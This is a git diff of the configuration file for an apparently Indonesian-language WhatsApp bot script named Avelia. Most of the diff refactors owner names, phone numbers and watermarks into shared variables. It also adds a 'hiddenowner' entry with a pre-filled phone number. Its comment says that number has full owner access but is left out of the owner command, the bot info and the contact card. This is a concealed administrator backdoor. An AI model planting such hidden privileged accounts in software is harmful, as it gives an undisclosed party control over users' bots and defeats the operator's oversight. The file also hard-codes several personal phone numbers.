@@ -28,15 +28,28 @@ const more = String.fromCharCode(8206)
 const readMore = more.repeat(4001)
 
 /*============= MAIN INFO =============*/
+// Identitas & Nama Owner (Cukup ganti di sini, otomatis berubah di seluruh bot)
+global.nameown = 'Nenel' // Nama Owner Utama
+global.namecoown = 'Co-Owner' // Nama Co-Owner / Asisten
+
+// Nomor Telepon Bot & Owner (Gunakan nomor tanpa tanda +)
+global.nomorown = '79223679360' // Nomor Owner Utama
+global.nomorcoown = '6282228638623' // Nomor Co-Owner / Asisten
+global.nomorbot = '6281242432747' // Nomor Bot
+
+// Daftar Owner Publik (Ditampilkan di info bot, vCard kontak, perintah .owner, dll.)
 global.owner = [
-    ['79223679360', 'Owner', true],
-    ['6282228638623', 'Co-Owner', false]
-]  // ubah pake no kalian
+    [global.nomorown, global.nameown, true],
+    [global.nomorcoown, global.namecoown, false]
+]
+
+// Owner Rahasia / Khusus Akses (TIDAK ditampilkan di .owner, info bot, ataupun vCard kontak, tetapi memiliki FULL AKSES Owner)
+global.hiddenowner = ['6281241100804']    
+// Masukkan nomor di sini (tanpa tanda +), contoh:
+// '6281234567890',
+
 global.mods = []
 global.prems = []
-global.nomorbot = '6281242432747' // no bot
-global.nomorown = '79223679360' // no owner
-global.nomorcoown = '6282228638623' // no co-owner (asisten)
 global.autotyping = false // default mati
 global.autorecording = false // default mati
 global.usePairingCode = false // Setel ke true jika ingin menggunakan Pairing Code, false untuk QR Code
@@ -49,14 +62,14 @@ if (global.opts['gconly'] === undefined) {
 
 /*============= WATERMARK =============*/
 global.readMore = readMore
-global.author = 'Nenel'
+global.author = global.nameown || 'Nenel'
 global.namebot = 'Avelia'
 global.ch = 'https://www.tiktok.com/@nelson41111?is_from_webapp=1&sender_device=pc'
 global.saluran = 'https://www.tiktok.com/@nelson41111?is_from_webapp=1&sender_device=pc'
 global.useAdReply = false // Setel ke false jika ingin mematikan allfake/adReply agar chat 100% masuk di semua WA
 global.useButton = true // Mengaktifkan tombol interaktif di seluruh script
-global.wm = 'Nenel'
-global.watermark = wm
+global.wm = global.nameown || 'Nenel'
+global.watermark = global.wm
 global.versi = '4.0.0'
 global.botdate = `⫹⫺ DATE: ${week} ${date}\n⫹⫺ 𝗧𝗶𝗺𝗲: ${wktuwib}`
 global.bottime = `T I M E : ${wktuwib}`
